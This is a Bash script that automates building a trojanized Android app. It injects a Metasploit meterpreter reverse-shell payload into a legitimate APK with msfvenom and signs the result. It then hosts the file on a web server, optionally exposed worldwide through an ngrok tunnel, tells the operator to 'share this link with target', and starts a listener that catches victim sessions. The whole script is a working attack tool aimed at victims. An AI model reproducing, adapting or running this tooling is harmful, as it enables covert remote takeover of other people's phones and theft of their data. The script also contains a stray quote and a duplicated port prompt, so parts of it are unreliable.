#!/bin/bash
# Advanced Inject Payload in Android APK
# Created By Md Ismail
# Enhanced Version with Advanced Features

set -e  # Exit on error

clear
cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 2.0 Enhanced
                             Created By : Md Ismail
                                YouTube : yt/mdismail                   

EOF
sleep 2

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to validate IP address
validate_ip() {
    local ip=$1
    local stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

# Function to validate port
validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
        return 0
    else
        return 1
    fi
}

# Function for colored output
print_success() {
    echo -e "\033[0;32m[✓] $1\033[0m"
}

print_error() {
    echo -e "\033[0;31m[✗] $1\033[0m"
}

print_info() {
    echo -e "\033[0;34m[INFO] $1\033[0m"
}

print_warning() {
    echo -e "\033[0;33m[WARNING] $1\033[0m"
}

#Checking For Root Access
print_info "Checking For Root User...."
sleep 1
if [[ $(id -u) -ne 0 ]]; then 
   print_error "You are Not Root! Please Run as root (sudo -i)"
   exit 1 
else 
   print_success "Root access confirmed"
fi

print_info "Checking and Installing Required Packages..."
sleep 1

# Update package list
print_info "Updating package repositories..."
sudo apt -y update > /dev/null 2>&1
print_success "Package repositories updated"

#Checking and Installing Required Packages with verification
pkgs=(metasploit-framework wget default-jdk aapt apksigner apache2 apktool zipalign)
missing_pkgs=()

for pkg in ${pkgs[@]}; do
    if ! dpkg -s $pkg 2>/dev/null | grep -q "Status: install"; then
        missing_pkgs+=("$pkg")
        print_warning "$pkg not found, installing..."
        sudo apt -y install $pkg > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            print_success "$pkg installed successfully"
        else
            print_error "Failed to install $pkg"
            exit 1
        fi
    else
        print_success "$pkg already installed"
    fi
done

if [ ${#missing_pkgs[@]} -eq 0 ]; then
    print_success "All required packages are already installed"
fi

sleep 1
clear

# Setup APKTOOL with version check
print_info "Setting up APKTool..."
if [ ! -f "apktool.jar" ]; then
    print_info "Downloading latest APKTool..."
    wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.12.1.jar -O apktool.jar
    if [ $? -eq 0 ]; then
        print_success "APKTool downloaded successfully"
        sudo mv apktool.jar /usr/local/bin/
        print_success "APKTool installed to /usr/local/bin/"
    else
        print_error "Failed to download APKTool"
        exit 1
    fi
else
    print_success "APKTool already exists"
fi

# Install zipalign if not present
if ! command_exists zipalign; then
    print_info "Installing zipalign..."
    if [ -f "zipalign_8.1.0+r23-2_amd64.deb" ]; then
        sudo dpkg -i zipalign_8.1.0+r23-2_amd64.deb 2>/dev/null || sudo apt -f install -y > /dev/null 2>&1
        print_success "zipalign installed"
    else
        sudo apt -y install zipalign > /dev/null 2>&1
        print_success "zipalign installed from repository"
    fi
else
    print_success "zipalign already installed"
fi

print_success "All required tools have been set up successfully"
sleep 1

# Advanced LHOST Configuration
clear
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║         ADVANCED PAYLOAD CONFIGURATION            ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""

# Network Type Selection
echo -e "\033[1;33m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;33m║         SELECT ATTACK MODE                        ║\033[0m"
echo -e "\033[1;33m╚════════════════════════════════════════════════════╝\033[0m"
echo ""
echo "1) Local Network (Same WiFi - Fast & Easy)"
echo "2) Global Attack (Any Distance - Uses Ngrok Tunnel)"
echo ""
read -p "Select mode [1-2] (default: 2): " attack_mode
attack_mode=${attack_mode:-2}

if [ "$attack_mode" = "1" ]; then
    use_ngrok=false
    print_info "Local Network mode selected"
else
    use_ngrok=true
    print_info "Global Attack mode selected (Ngrok will be configured)"
fi
echo ""

if [ "$use_ngrok" = false ]; then
    # Get network interfaces and IPs
    print_info "Available Network Interfaces:"
    ifconfig 2>/dev/null | grep -E "^[a-z0-9]+:" | awk -F: '{print "  - " $1}' || ip addr show 2>/dev/null | grep "inet " | awk '{print "  Interface: " $NF, "IP: " $2}'
    echo ""
    
    # Auto-detect local IP
    local_ip=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $7; exit}' || hostname -I 2>/dev/null | awk '{print $1}')
    if [ -n "$local_ip" ]; then
        print_info "Auto-detected IP: $local_ip"
        read -p "Set Your LHOST (or press Enter for auto-detect): " lhost
        lhost=${lhost:-$local_ip}
    else
        read -p "Set Your LHOST: " lhost
    fi
    
    # Validate IP
    if ! validate_ip "$lhost"; then
        print_error "Invalid IP address format!"
        exit 1
    fi
    print_success "LHOST set to: $lhost"
else
    # Ngrok Setup for Global Access
    print_info "Setting up Ngrok for global access..."
    echo ""
    
    # Check if Ngrok is installed
    if ! command_exists ngrok; then
        print_warning "Ngrok not found. Installing automatically..."
        echo ""
        
        # Detect architecture
        arch=$(uname -m)
        if [ "$arch" = "x86_64" ]; then
            ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
        elif [ "$arch" = "aarch64" ]; then
            ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
        else
            ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz"
        fi
        
        print_info "Downloading Ngrok ($arch)..."
        if wget -q "$ngrok_url" -O /tmp/ngrok.tgz; then
            print_success "Ngrok downloaded successfully"
            
            # Extract and install
            print_info "Extracting Ngrok..."
            tar -xzf /tmp/ngrok.tgz -d /usr/local/bin/
            chmod +x /usr/local/bin/ngrok
            
            if command_exists ngrok; then
                print_success "Ngrok installed successfully at /usr/local/bin/ngrok"
            else
                print_error "Ngrok installation failed!"
                exit 1
            fi
        else
            print_error "Failed to download Ngrok!"
            print_info "Trying alternative method..."
            
            # Alternative: Install via snap
            if command_exists snap; then
                sudo snap install ngrok
                if [ $? -eq 0 ]; then
                    print_success "Ngrok installed via snap"
                else
                    print_error "All installation methods failed!"
                    print_info "Please install Ngrok manually:"
                    print_info "1. Visit https://ngrok.com/download"
                    print_info "2. Download for Linux"
                    print_info "3. Extract to /usr/local/bin/"
                    exit 1
                fi
            else
                print_error "Ngrok installation failed!"
                print_info "Please install manually:"
                print_info "wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
                print_info "tar -xzf ngrok-v3-stable-linux-amd64.tgz"
                print_info "sudo mv ngrok /usr/local/bin/"
                exit 1
            fi
        fi
        
        # Cleanup
        rm -f /tmp/ngrok.tgz
    else
        print_success "Ngrok already installed: $(which ngrok)"
    fi
    
    # Check Ngrok authentication
    echo ""
    print_info "Checking Ngrok authentication..."
    
    # Check if ngrok is authenticated
    if ! ngrok config check 2>/dev/null | grep -q "validated"; then
        print_warning "Ngrok is not authenticated!"
        echo ""
        print_info "To get your Ngrok authtoken:"
        print_info "1. Visit https://dashboard.ngrok.com/signup"
        print_info "2. Create a free account"
        print_info "3. Go to https://dashboard.ngrok.com/get-started/your-authtoken"
        print_info "4. Copy your authtoken"
        echo ""
        read -p "Enter your Ngrok authtoken (or press Enter to skip): " ngrok_token
        
        if [ -n "$ngrok_token" ]; then
            ngrok config add-authtoken "$ngrok_token" 2>/dev/null
            if [ $? -eq 0 ]; then
                print_success "Ngrok authenticated successfully!"
            else
                print_warning "Authentication may have failed, continuing anyway..."
            fi
        else
            print_warning "Running without authentication (limited features)"
            print_info "You can still use Ngrok with limitations"
        fi
    else
        print_success "Ngrok is authenticated"
    fi
    
    # Set local port for ngrok
    print_info "Common ports: 4444, 8080, 1337, 443, 53"
    read -p "Set Your Local LPORT (for Ngrok tunnel): " lport
    
    if ! validate_port "$lport"; then
        print_error "Invalid port number! Must be between 1-65535"
        exit 1
    fi
    print_success "LPORT set to: $lport"
    
    # Start Ngrok tunnel
    echo ""
    print_info "Starting Ngrok TCP tunnel on port $lport..."
    
    # Kill any existing ngrok processes
    pkill -f "ngrok tcp" 2>/dev/null
    sleep 1
    
    # Start ngrok in background
    ngrok tcp "$lport" --log=/tmp/ngrok.log &
    NGROK_PID=$!
    
    print_success "Ngrok process started (PID: $NGROK_PID)"
    print_info "Waiting for tunnel to initialize..."
    sleep 5
    
    # Get Ngrok forwarding URL
    max_attempts=10
    attempt=0
    ngrok_url=""
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        
        # Try to get ngrok URL from API
        ngrok_response=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null)
        
        if [ -n "$ngrok_response" ]; then
            # Extract TCP forwarding URL
            ngrok_url=$(echo "$ngrok_response" | grep -o 'tcp://[^"]*' | head -1 | sed 's/tcp:\/\///')
            
            if [ -n "$ngrok_url" ]; then
                # Parse host and port
                ngrok_host=$(echo "$ngrok_url" | cut -d':' -f1)
                ngrok_port=$(echo "$ngrok_url" | cut -d':' -f2)
                
                if [ -n "$ngrok_host" ] && [ -n "$ngrok_port" ]; then
                    print_success "Ngrok tunnel established!"
                    print_success "Public Address: $ngrok_url"
                    break
                fi
            fi
        fi
        
        print_info "Waiting for tunnel... (Attempt $attempt/$max_attempts)"
        sleep 3
    done
    
    if [ -z "$ngrok_url" ]; then
        print_error "Failed to establish Ngrok tunnel!"
        print_info "Check /tmp/ngrok.log for details"
        print_info "You may need to authenticate Ngrok first"
        exit 1
    fi
    
    # Set LHOST to ngrok URL
    lhost="$ngrok_host"
    lport="$ngrok_port"
    
    echo ""
    print_success "Global access configured!"
    print_info "Public LHOST: $lhost"
    print_info "Public LPORT: $lport"
    print_info "Victim can connect from ANYWHERE in the world!"
fi"

# Advanced LPORT Configuration
echo ""
print_info "Common ports: 4444, 8080, 1337, 443, 53"
read -p "Set Your LPORT: " lport

if ! validate_port "$lport"; then
    print_error "Invalid port number! Must be between 1-65535"
    exit 1
fi
print_success "LPORT set to: $lport"

# Payload Selection
echo ""
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║           SELECT PAYLOAD TYPE                      ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo "1) android/meterpreter/reverse_tcp (Standard)"
echo "2) android/meterpreter/reverse_http (HTTP)"
echo "3) android/meterpreter/reverse_https (HTTPS - Recommended)"
echo "4) android/shell/reverse_tcp (Shell)"
echo ""
read -p "Select payload [1-4] (default: 3): " payload_choice
case ${payload_choice:-3} in
    1) payload="android/meterpreter/reverse_tcp" ;;
    2) payload="android/meterpreter/reverse_http" ;;
    3) payload="android/meterpreter/reverse_https" ;;
    4) payload="android/shell/reverse_tcp" ;;
    *) payload="android/meterpreter/reverse_https" ;;
esac
print_success "Selected payload: $payload"

# APK File Selection
echo ""
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║            APK FILE SELECTION                       ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""

# List available APK files
apk_files=(*.apk)
if [ ${#apk_files[@]} -eq 0 ] || [ ! -e "${apk_files[0]}" ]; then
    print_error "No APK files found in current directory!"
    exit 1
fi

echo "Available APK files:"
for i in "${!apk_files[@]}"; do
    echo "  $((i+1)). ${apk_files[$i]} ($(du -h "${apk_files[$i]}" | cut -f1))"
done
echo ""

read -p "Select APK file number (or press Enter for first): " apk_choice
if [ -z "$apk_choice" ]; then
    capk="${apk_files[0]}"
else
    capk="${apk_files[$((apk_choice-1))]}"
fi

if [ ! -f "$capk" ]; then
    print_error "APK file not found: $capk"
    exit 1
fi
print_success "Selected APK: $capk ($(du -h "$capk" | cut -f1))"

# Verify APK structure
print_info "Verifying APK structure..."
if ! aapt dump badging "$capk" > /dev/null 2>&1; then
    print_error "Invalid or corrupted APK file!"
    exit 1
fi

# Extract app info
app_name=$(aapt dump badging "$capk" 2>/dev/null | grep "application-label:" | head -1 | cut -d"'" -f2)
app_package=$(aapt dump badging "$capk" 2>/dev/null | grep "package:" | head -1 | cut -d"'" -f2)
app_version=$(aapt dump badging "$capk" 2>/dev/null | grep "versionName=" | head -1 | cut -d"'" -f2)

print_success "App Name: ${app_name:-Unknown}"
print_success "Package: ${app_package:-Unknown}"
print_success "Version: ${app_version:-Unknown}"

# Output APK Configuration
echo ""
read -p "Write the Output APK Name (default: infected_$capk): " bapk
if [ -z "$bapk" ]; then
    bapk="infected_${capk}"
fi

# Ensure .apk extension
if [[ ! "$bapk" =~ \.apk$ ]]; then
    bapk="${bapk}.apk"
fi

print_success "Output APK: $bapk"
sleep 1

clear

# Advanced Payload Injection
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║          INJECTING PAYLOAD                          ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""

print_info "Creating backup of original APK..."
cp "$capk" "backup_${capk}"
print_success "Backup created: backup_${capk}"

echo ""
print_info "Injecting payload into APK..."
print_info "Payload: $payload"
print_info "LHOST: $lhost"
print_info "LPORT: $lport"
echo ""

# Inject payload with advanced options
if msfvenom -x "$capk" -p "$payload" lhost="$lhost" lport="$lport" -o "$bapk" --platform android --arch dalvik 2>&1 | tee /tmp/inject.log; then
    print_success "Payload injected successfully!"
    
    # Verify output file
    if [ -f "$bapk" ]; then
        output_size=$(du -h "$bapk" | cut -f1)
        print_success "Output APK created: $bapk ($output_size)"
    else
        print_error "Output APK not created! Check /tmp/inject.log for details"
        exit 1
    fi
else
    print_error "Payload injection failed!"
    print_error "Check /tmp/inject.log for error details"
    exit 1
fi

sleep 1

# APK Optimization and Signing
echo ""
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║       OPTIMIZING & SIGNING APK                     ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""

# Align APK if zipalign is available
if command_exists zipalign; then
    print_info "Aligning APK with zipalign..."
    aligned_apk="aligned_${bapk}"
    if zipalign -v -p 4 "$bapk" "$aligned_apk" > /dev/null 2>&1; then
        mv "$aligned_apk" "$bapk"
        print_success "APK aligned successfully"
    else
        print_warning "zipalign failed, continuing anyway"
    fi
fi

# Sign APK
echo ""
print_info "Generating debug keystore for signing..."
if [ ! -f "debug.keystore" ]; then
    keytool -genkey -v -keystore debug.keystore -storepass android -keypass android -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US" > /dev/null 2>&1
    print_success "Debug keystore created"
fi

print_info "Signing APK with apksigner..."
if command_exists apksigner; then
    apksigner sign --ks debug.keystore --ks-pass pass:android "$bapk" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        print_success "APK signed successfully"
        
        # Verify signature
        if apksigner verify "$bapk" > /dev/null 2>&1; then
            print_success "APK signature verified"
        else
            print_warning "Signature verification failed (may still work)"
        fi
    else
        print_warning "Signing failed, APK may still work on some devices"
    fi
else
    print_warning "apksigner not found, skipping signing step"
fi

sleep 1

# Web Server Setup
clear
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║       SETTING UP DISTRIBUTION SERVER               ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""

print_info "Configuring web server..."

# Stop Apache if running
sudo service apache2 stop > /dev/null 2>&1
sleep 1

# Setup web directory
web_dir="/var/www/html"
if [ -d "$web_dir" ]; then
    print_success "Web directory exists: $web_dir"
else
    print_info "Creating web directory..."
    sudo mkdir -p "$web_dir"
    sudo chown -R $USER:$USER "$web_dir"
fi

# Copy APK to web server
print_info "Copying infected APK to web server..."
sudo cp "$bapk" "$web_dir/$bapk"
if [ $? -eq 0 ]; then
    print_success "APK copied to web server"
else
    print_error "Failed to copy APK to web server"
    exit 1
fi

# Set proper permissions
sudo chmod 644 "$web_dir/$bapk"

# Start Apache
print_info "Starting web server..."
sudo service apache2 start
if [ $? -eq 0 ]; then
    print_success "Apache web server started"
else
    print_warning "Failed to start Apache, trying alternative method..."
    sudo systemctl start apache2 2>/dev/null || sudo apachectl start 2>/dev/null
    
    # If Apache still fails, use Python HTTP server
    if [ $? -ne 0 ]; then
        print_warning "Apache failed, using Python HTTP server..."
        cd "$web_dir" && python3 -m http.server 80 &
        WEB_SERVER_PID=$!
        print_success "Python HTTP server started (PID: $WEB_SERVER_PID)"
    fi
fi

sleep 1

# Generate download link
echo ""

if [ "$use_ngrok" = true ] && [ -n "${ngrok_url:-}" ]; then
    # For global attack, extract only the public IP
    download_url="http://$lhost/$bapk"
    
    echo -e "\033[1;32m╔════════════════════════════════════════════════════╗\033[0m"
    echo -e "\033[1;32m║     GLOBAL ACCESS - APK READY FOR WORLDWIDE!       ║\033[0m"
    echo -e "\033[1;32m╚════════════════════════════════════════════════════╝\033[0m"
    echo ""
    print_info "🌍 GLOBAL DOWNLOAD URL: $download_url"
    print_info "This link works from ANYWHERE in the world!"
    print_info "Share this link with target"
    echo ""
    
    # Generate QR code if qrencode is available
    if command_exists qrencode; then
        print_info "Generating QR code for download link..."
        qrencode -t ANSIUTF8 -s 3 "$download_url"
        echo ""
    fi
    
    # Show Ngrok tunnel info
    echo ""
    echo -e "\033[1;33m╔════════════════════════════════════════════════════╗\033[0m"
    echo -e "\033[1;33m║         NGROK TUNNEL INFORMATION                  ║\033[0m"
    echo -e "\033[1;33m╚════════════════════════════════════════════════════╝\033[0m"
    echo ""
    print_info "Ngrok Public URL: tcp://$ngrok_url"
    print_info "Forwarding to: 127.0.0.1:$lport"
    print_info "Victim Location: ANYWHERE (Global)"
    print_info "Max Distance: UNLIMITED 🌍"
    echo ""
else
    # Local network mode
    if [ "$lhost" != "127.0.0.1" ] && [ "$lhost" != "localhost" ]; then
        download_url="http://$lhost/$bapk"
        echo ""
        echo -e "\033[1;32m╔════════════════════════════════════════════════════╗\033[0m"
        echo -e "\033[1;32m║         APK READY FOR LOCAL NETWORK!               ║\033[0m"
        echo -e "\033[1;32m╚════════════════════════════════════════════════════╝\033[0m"
        echo ""
        print_info "Download URL: $download_url"
        print_info "Victim must be on the same WiFi network"
        echo ""
        
        # Generate QR code if qrencode is available
        if command_exists qrencode; then
            print_info "Generating QR code for download link..."
            qrencode -t ANSIUTF8 -s 3 "$download_url"
            echo ""
        fi
    else
        echo ""
        print_warning "LHOST is set to localhost - download URL won't be accessible remotely"
        echo ""
    fi
fi

# Final Summary
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║              ATTACK SUMMARY                          ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""
print_info "Attack Mode     : $([ "$use_ngrok" = true ] && echo 'GLOBAL 🌍' || echo 'LOCAL NETWORK')"
print_info "Payload Type    : $payload"
print_info "Listener IP     : $lhost"
print_info "Listener Port   : $lport"
print_info "Original APK    : $capk"
print_info "Infected APK    : $bapk"
print_info "Backup APK      : backup_${capk}"

if [ "$use_ngrok" = true ] && [ -n "${ngrok_url:-}" ]; then
    print_info "Ngrok Tunnel    : tcp://$ngrok_url"
    print_info "Access Range    : UNLIMITED (Worldwide)"
fi

if [ -n "${download_url:-}" ]; then
    print_info "Download Link   : $download_url"
fi

echo ""

if [ "$use_ngrok" = true ]; then
    print_warning "Ngrok tunnel is active - keep this terminal running!"
    print_warning "Closing this terminal will stop the Ngrok tunnel"
else
    print_warning "Ensure port forwarding is configured if targeting external networks"
    print_warning "Make sure firewall allows incoming connections on port $lport"
fi

echo ""
read -p "Press Enter to start Metasploit listener..."

clear

# Starting Msfconsole Handler with advanced options
echo -e "\033[1;36m╔════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;36m║     STARTING METASPLOIT LISTENER                    ║\033[0m"
echo -e "\033[1;36m╚════════════════════════════════════════════════════╝\033[0m"
echo ""
print_success "Ready to capture sessions!"
print_info "Waiting for incoming connections..."
echo ""

if [ "$use_ngrok" = true ]; then
    print_info "🌍 GLOBAL MODE: Victim can connect from anywhere in the world!"
    print_info "Ngrok tunnel is forwarding traffic to your machine"
    echo ""
fi

# Create Metasploit resource file for advanced configuration
cat > /tmp/msf_listener.rc << EOF
use exploit/multi/handler
set payload $payload
set lhost 0.0.0.0
set lport $lport
set ExitOnSession false
set AutoRunScript 'post/multi/manage/suggester'
exploit -j -z
EOF

print_info "Starting msfconsole with auto-configuration..."
echo ""

# Trap to cleanup on exit
cleanup() {
    echo ""
    print_info "Cleaning up..."
    
    # Stop Ngrok if running
    if [ "$use_ngrok" = true ] && [ -n "${NGROK_PID:-}" ]; then
        print_info "Stopping Ngrok tunnel..."
        kill $NGROK_PID 2>/dev/null
        pkill -f "ngrok tcp" 2>/dev/null
        print_success "Ngrok stopped"
    fi
    
    # Stop web server if Python
    if [ -n "${WEB_SERVER_PID:-}" ]; then
        print_info "Stopping Python HTTP server..."
        kill $WEB_SERVER_PID 2>/dev/null
        print_success "Web server stopped"
    fi
    
    # Remove temp files
    rm -f /tmp/inject.log /tmp/msf_listener.rc /tmp/ngrok.log
    
    print_success "Cleanup complete!"
    exit 0
}

trap cleanup EXIT INT TERM

# Start Metasploit
msfconsole -q -r /tmp/msf_listener.rc

# Cleanup (also runs on normal exit)
rm -f /tmp/inject.log /tmp/msf_listener.rc
